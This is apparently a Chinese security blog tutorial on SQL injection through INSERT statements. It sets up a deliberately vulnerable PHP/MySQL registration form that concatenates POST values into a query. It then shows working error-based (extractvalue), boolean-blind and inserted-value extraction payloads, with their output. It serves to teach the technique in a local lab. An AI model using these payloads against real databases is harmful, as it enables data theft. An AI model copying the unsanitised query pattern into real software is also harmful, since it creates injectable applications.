---
title: insert 注入
tags:
  - Web
  - 注入
category: [渗透测试,Web安全,SQL注入]
abbrlink: 7e490dd2
date: 2017-05-09 22:42:34
---
## 0x00 前言
我们最常见的注入就是在查询中注入，那你有没有遇到过插入的时候也能注入。插入中最常见的就是注册用户或者撰写文章。当然，注册用户的时候可能会考虑去数据库查询下有没有这个人，这涉及到查询时候的注入，我们今天忽略这种注入。
<!--more-->
## 0x01 例子
下面我给出一个简单的例子，基于php+mysql的。方便实验
```mysql
create database sqli;
use sqli;
create table user(
name varchar(40),
email  varchar(20),
qq varchar(20)
);
```
<!-- more -->
```php
前端
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
<title>Examples</title>
<meta name="description" content="">
<meta name="keywords" content="">
<link href="" rel="stylesheet">
</head>
<body>
   <form action="register.php" method="post">
        Name: <input type="text" name="name" />
        Email: <input type="text" name="email" />
        QQ: <input type="text" name="qq" />
        <input type="submit" />
    </form>

   </form> 
</body>
</html>
```
```php
后端
<?php
/**
 * 
 * @authors daiker
 * @date    2017-05-09 20:08:53
 * @version $Id$
 */
$conn=mysql_connect('127.0.0.1', 'root', 'root');
if(!$conn){
    die("mysql connect error");
}
mysql_select_db("sqli",$conn);

$sql="insert into user(name,email,qq) values ('$_POST[name]','$_POST[email]','$_POST[qq]')";


$result=mysql_query($sql,$conn);
print_r(mysql_error());
if(!$result){
    die("error");
}

echo "Yes";
?>
```

效果

![图片.png](http://upload-images.jianshu.io/upload_images/5443560-e0ee8fd70dd992ae.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

## 0x02分析注入
我们常见的注入有4种
- 报错注入
- 联合查询
- 盲注
- 堆叠查询
联合查询前后都要`SELECT`,排除
堆叠查询，mysql不支持排除，那就只剩下报错注入和盲注。
报错注入条件比较苛刻，需要显示报错信息.

## 0x03报错注入
报错注入条件比较苛刻，需要显示报错信息.
报错注入，那就要能报错，可以用`floor()`,`updatexml()`,`extractvalue()`。
这里以`extractvalue()`为例
首先闭合，有两种方法,内联式和注释法
内联式的话,就是加and '1'='1来闭合后面的引号
注释式的话，就是够着1','','')#这样的语句
然后利用extractvalue报错

```
name=ee' and extractvalue(1,' ') and '1'='1 &email=aa&qq=aa
```

报错了

```
XPATH syntax error: ''
```

然后修改`extractvalue()的第二个值以此提取数据

```
name=ee' and extractvalue(1,concat(0x5e5e5e,database(),0x5e5e5e)) and '1'='1 &email=aa&qq=aa
```

0x5e5e5e据^^^为方便观看
爆出数据库

```
XPATH syntax error: '^^^sqli^^^'
```


## 0x04 盲注

实验前删除上面语句的`print_r(mysql_error());`

因为报错注入要求必须报错，但是一旦不显示错误，就比较困难了。
如果是布尔型盲注，关键是让返回的结果不一样，也就是让语句不能正确执行，这里的话，我利用if((1=1),a,b)，a和b会导致整个语句返回的结果不同，那我们执行的语句不久可以放在(1=1)这里，但是怎么构造呢?
最开始想的是用报错注入那几个函数,比如`extractvalue`，但是无论如何都不能执行，后来本地调试了一下

![图片.png](http://upload-images.jianshu.io/upload_images/5443560-23d1f214772355dc.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)
大致可以推出if语句后面两个参数都是会执行的，不管有没有被选中，但是谁被选中，就把执行的结果返回。
后来讲过大佬点拨，发现了一个语句。

```
select 1 from information_schema.tables
```

这个语句的话执行是不会报错的

![图片.png](http://upload-images.jianshu.io/upload_images/5443560-542b9c8dc59abf8b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)
但是注意看图，会发现，他返回的结果特别多。没错，就是这一点，
多行结果跟1 and 会报错。

![图片.png](http://upload-images.jianshu.io/upload_images/5443560-0d199c72402c0b3f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)
最后构造语句

```
name=ee' and if((A),1,(select 1 from information_schema.tables)) &email=aa&qq=a
```

其中A是我们自己构造的语句，参见盲注的文章自己构造

但是有一点必须强调，这样的后果就是数据库会残留下大量语句。尽量不要用这招

## 0x05 在插入数据可以查询的情况下

```mysql
mysql> insert into user values('daiker','t@qq.com',user());
Query OK, 1 row affected (0.00 sec)

mysql> select * from user;
+--------+----------+----------------+
| name   | email    | qq             |
+--------+----------+----------------+
| daiker | t@qq.com | root@localhost |
+--------+----------+----------------+
1 row in set (0.00 sec)
```
当然有时候可能插入点是整型的，可以这样
```mysql
mysql> insert into user values('daiker','t@qq.com',0|hex(substr('daiker666',1,1)));
Query OK, 1 row affected (0.00 sec)

mysql> select * from user;
+--------+----------+----------------+
| name   | email    | qq             |
+--------+----------+----------------+
| daiker | t@qq.com | root@localhost |
| daiker | t@qq.com | 64             |
+--------+----------+----------------+
2 rows in set (0.00 sec)
```
通过substr,mid，left之类的一个个提取出来。然后再转为16进制，跟0或。
